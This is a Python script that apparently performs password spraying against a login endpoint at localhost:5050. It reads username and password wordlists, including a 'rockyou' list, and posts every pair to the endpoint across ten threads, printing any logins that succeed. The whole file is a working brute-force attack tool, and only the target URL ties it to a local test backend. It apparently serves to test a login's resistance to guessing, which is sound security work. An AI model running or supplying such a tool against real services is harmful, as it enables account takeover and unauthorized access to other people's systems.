import os
import requests
from concurrent.futures import ThreadPoolExecutor

# Set the correct target URL for the login endpoint on your backend
url = "http://localhost:5050/login"

# Define headers (optional)
headers = {
    'User-Agent': 'Mozilla/5.0',
    'Content-Type': 'application/json'  # Ensure correct content type
}

# Function to read the usernames from a file
def read_usernames(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file.readlines()]

# Function to read the passwords from a file
def read_passwords(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file.readlines()]

# Function to perform a single login attempt
def attempt_login(username, password):
    data = {
        'username': username,
        'password': password
    }

    try:
        response = requests.post(url, json=data, headers=headers)

        # Check the HTTP status code
        if response.status_code == 200:
            print(f"[+] Successful login with {username}:{password} (Status Code: {response.status_code})")
        elif response.status_code == 302:  # Redirect (could indicate success in some systems)
            print(f"[+] Successful login with {username}:{password} (Redirect to: {response.headers.get('Location', 'unknown')})")
        elif response.status_code == 401:
            print(f"[-] Failed login for {username} (Status Code: 401 Unauthorized)")
        elif response.status_code == 403:
            print(f"[-] Failed login for {username} (Status Code: 403 Forbidden)")
        else:
            print(f"[-] Failed login for {username} (Status Code: {response.status_code})")
    except Exception as e:
        print(f"[-] Error occurred for {username}: {e}")

# Function to perform password spraying
def password_spray(usernames, passwords):
    # Using ThreadPoolExecutor to manage a pool of threads
    with ThreadPoolExecutor(max_workers=10) as executor:
        # Iterate through each username and try each password
        for username in usernames:
            for password in passwords:
                executor.submit(attempt_login, username, password)

# Run the password spray
if __name__ == "__main__":
    # Get the directory of the current script
    base_dir = os.path.dirname(os.path.abspath(__file__))

    # Build paths relative to the script's directory
    username_file_path = os.path.join(base_dir, 'data', 'TestInput', 'top-usernames.txt')
    password_file_path = os.path.join(base_dir, 'data', 'TestInput', 'rockyou-500.txt')

    # Read the usernames and passwords from files
    usernames = read_usernames(username_file_path)
    passwords = read_passwords(password_file_path)

    # Run the password spray
    password_spray(usernames, passwords)
